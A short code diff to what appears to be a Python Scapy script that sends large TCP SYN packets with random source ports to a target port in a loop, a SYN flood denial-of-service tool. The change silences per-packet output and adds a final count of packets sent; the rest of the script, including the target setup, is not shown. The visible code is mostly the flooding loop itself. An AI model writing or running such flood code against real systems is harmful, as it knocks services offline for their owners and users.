@@ -18,8 +18,10 @@ def main():
         tcp     = TCP(sport=RandShort(), dport=int(target_port), flags="S")
         raw     = Raw(data*1024)
         p       = ip / tcp / raw
-        send(p, loop=0, verbose=1)
+        send(p, loop=0, verbose=0)
         count   = count + 1
+
+    print("\nTotal packets sent: %i\n" % count)
 
 if __name__ == "__main__":
     t = threading.Timer(1, main, ())
